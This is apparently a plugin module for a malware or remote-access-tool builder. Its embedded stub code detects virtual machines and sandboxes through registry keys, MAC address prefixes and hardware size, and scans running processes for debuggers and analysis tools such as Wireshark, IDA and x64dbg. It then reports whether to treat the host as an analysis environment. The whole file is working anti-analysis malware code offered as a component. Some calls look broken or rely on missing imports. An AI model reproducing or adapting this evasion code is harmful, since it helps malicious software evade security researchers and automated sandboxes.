PLUGIN = {"name": "anti_vm", "desc": "Anti-VM/anti-sandbox detection checks", "deps": [], "size": 2.8}

STUB_CODE = r"""
import ctypes

def _vm_check_registry():
    import winreg
    flags = []
    checks = [
        (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\DSDT\VBOX__", "VirtualBox ACPI"),
        (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\FADT\VBOX__", "VirtualBox FADT"),
        (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\RSDT\VBOX__", "VirtualBox RSDT"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions", "VBox GA"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters", "Hyper-V"),
        (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", "VMware"),
    ]
    for hive, key, name in checks:
        try:
            with winreg.OpenKey(hive, key, 0, winreg.KEY_READ) as k:
                winreg.QueryValueEx(k, "")
                flags.append(name)
        except: pass
    # Check for VMware specific identifiers in SCSI
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", 0, winreg.KEY_READ) as k:
            val, _ = winreg.QueryValueEx(k, "Identifier")
            if "VMware" in str(val): flags.append("VMware_SCSI")
    except: pass
    return flags

def _vm_check_processes():
    names = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
             "xenservice.exe", "xensrvc.exe", "qemu-ga.exe", "procmon.exe", "procmon64.exe",
             "wireshark.exe", "dumpcap.exe", "ollydbg.exe", "x64dbg.exe", "x32dbg.exe",
             "ida.exe", "idag.exe", "ida64.exe", "immunitydbg.exe", "windbg.exe",
             "devenv.exe", "taskmgr.exe", "httpdebuggerui.exe", "fiddler.exe", "regmon.exe",
             "filemon.exe", "tcpview.exe", "autoruns.exe", "processhacker.exe",
             "pestudio.exe", "resourcehacker.exe", "vmtoolsd.exe", "vboxservice.exe"]
    found = []
    if platform.system() == "Windows":
        try:
            out = subprocess.check_output("tasklist", creationflags=0x08000000).decode(errors="ignore").lower()
            for n in names:
                if n.lower() in out: found.append(n)
        except: pass
    else:
        try:
            out = subprocess.check_output(["ps", "aux"], timeout=10).decode(errors="ignore").lower()
            for n in names:
                if n.lower() in out: found.append(n)
        except: pass
    return found

def _vm_check_system():
    checks = []
    # CPU count
    try:
        if platform.system() == "Windows":
            import ctypes
            kernel32 = ctypes.windll.kernel32
            cpu_count = kernel32.GetSystemInfo().dwNumberOfProcessors if hasattr(kernel32, "GetSystemInfo") else 0
            # simplified: use os.cpu_count
        cpu = os.cpu_count() or 0
        if cpu <= 2: checks.append(f"Low CPU cores ({cpu})")
    except: pass
    # RAM size
    try:
        if platform.system() == "Windows":
            kernel32 = ctypes.windll.kernel32
            mem = ctypes.c_ulonglong()
            kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(mem))
            ram_mb = mem.value // 1024
            if ram_mb < 2048: checks.append(f"Low RAM ({ram_mb} MB)")
    except: pass
    # Disk size
    try:
        import shutil
        for d in ("C:\\", "/"):
            try:
                du = shutil.disk_usage(d)
                if du.total < 60 * 1024**3:
                    checks.append(f"Small disk ({d}: {du.total//1024**3} GB)")
                    break
            except: pass
    except: pass
    return checks

def _vm_check_mac():
    try:
        import uuid
        mac = uuid.getnode()
        prefixes = ["080027", "000569", "001C42", "000C29", "005056", "001C14", "000F4B"]
        mac_str = format(mac, "012x")
        for p in prefixes:
            if mac_str.startswith(p.lower()):
                return [f"VM MAC prefix: {p}"]
    except: pass
    return []

def _cmd_check_vm(m):
    try:
        results = {}
        results["registry"] = _vm_check_registry()
        results["processes"] = _vm_check_processes()
        results["system"] = _vm_check_system()
        results["mac"] = _vm_check_mac()
        all_flags = [item for sublist in results.values() for item in sublist]
        output = "[+] VM Detection Results:\n"
        if all_flags:
            output += f"  [!] VM indicators found ({len(all_flags)}):\n"
            for cat, items in results.items():
                if items:
                    output += f"    [{cat}] {', '.join(items)}\n"
        else:
            output += "  [OK] No VM indicators detected\n"
        return {"output": output, "vm_detected": len(all_flags) > 0}
    except Exception as e: return {"output": f"[!] VM check error: {e}"}
_CMDS["check_vm"] = _cmd_check_vm
"""

def get_commands():
    return {"check_vm": "_cmd_check_vm"}
